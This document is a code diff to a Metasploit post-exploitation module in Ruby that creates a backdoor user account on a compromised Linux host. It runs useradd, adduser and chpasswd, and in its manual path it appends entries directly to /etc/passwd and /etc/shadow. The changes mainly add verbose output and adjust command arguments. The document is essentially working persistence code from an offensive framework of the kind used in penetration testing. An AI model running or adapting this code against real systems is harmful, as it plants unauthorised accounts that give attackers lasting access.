@@ -105,9 +105,10 @@ class MetasploitModule < Msf::Post
 
     case binary
     when 'useradd'
+      vprint_status('Useradd exists. Using that')
+      vprint_status("Running on #{os_platform}")
       case os_platform
       when /debian|ubuntu|fedora|centos|oracle|redhat|arch|suse|gentoo/i
-        vprint_status('Adduser exists. Using that')
         homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home-dir #{datastore['HOME']}"
 
         # Since command can add on groups, checking over groups
@@ -125,24 +126,27 @@ class MetasploitModule < Msf::Post
         groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"
 
         # Finally run it
-        cmd_exec("useradd --password #{passwd} #{homedirc} --groups #{groups.join(',')} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}")
+        command = "useradd --password #{passwd} #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}".gsub(/ {2,}/, ' ')
+        vprint_status(command)
+        vprint_line(cmd_exec(command))
         groups_handled = true
       else
         vprint_status('Unsure what platform were on. Using useradd in most basic/common settings')
 
         # Finally run it
-        cmd_exec("useradd #{datastore['USERNAME']} | echo")
-        cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e -c md5")
+        vprint_status(cmd_exec("useradd #{datastore['USERNAME']} | echo"))
+        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
       end
     when 'adduser'
+      vprint_status("Running on #{os_platform}")
+      vprint_status('Adduser exists. Using that')
       case os_platform
       when /debian|ubuntu/i
-        vprint_status('Adduser exists. Using that')
         vprint_bad('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')
         homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home #{datastore['HOME']}"
 
-        cmd_exec("adduser --disabled-password #{homedirc} --shell #{datastore['SHELL']} #{datastore['USERNAME']}")
-        cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e -c MD5")
+        vprint_status(cmd_exec("adduser --disabled-password #{homedirc} --shell #{datastore['SHELL']} #{datastore['USERNAME']} | echo"))
+        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
       when /fedora|centos|oracle|redhat/i
         vprint_status('Useradd exists. Using that')
         homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home-dir #{datastore['HOME']}"
@@ -162,32 +166,31 @@ class MetasploitModule < Msf::Post
         groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"
 
         # Finally run it
-        cmd_exec("adduser --password #{passwd} #{homedirc} --groups #{groups.join(',')} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}")
+        vprint_status(cmd_exec("adduser --password #{passwd} #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}".gsub(/ {2,}/, ' ')))
         groups_handled = true
       when /alpine/i
-        vprint_status('Adduser exists. Using that')
         vprint_bad('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')
         homedirc = datastore['HOME'].empty? ? '-H' : "-h #{datastore['HOME']}"
 
-        cmd_exec("adduser -D #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}")
-        cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e -c md5")
+        vprint_status(cmd_exec("adduser -D #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}"))
+        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
       else
         vprint_status('Unsure what platform were on. Using useradd in most basic/common settings')
 
         # Finally run it
-        cmd_exec("useradd #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}")
-        cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e -c md5")
+        vprint_status(cmd_exec("adduser #{datastore['USERNAME']}"))
+        vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
       end
     when binary != 'MANUAL' ? datastore['UseraddBinary'] : ''
-      vprint_status('Running with command supplied')
-      cmd_exec("#{bin} #{datastore['USERNAME']}")
-      cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e -c md5")
+      print_status('Running with command supplied')
+      vprint_status(cmd_exec("#{bin} #{datastore['USERNAME']}"))
+      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e"))
     else
       # Run adding user manually if set
       home = datastore['HOME'].empty? ? "/home/#{datastore['USERNAME']}" : datastore['HOME']
       uid = rand(1000..2000).to_s
-      cmd_exec("echo \'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd")
-      cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}::0:99999:7:::\' >> /etc/shadow") # TODO: Finalize this line
+      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd"))
+      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}::0:99999:7:::\' >> /etc/shadow")) # TODO: Finalize this line
       group_file_save = group_file
       groups.each do |group|
         if check_group_exists?(group, group_file)
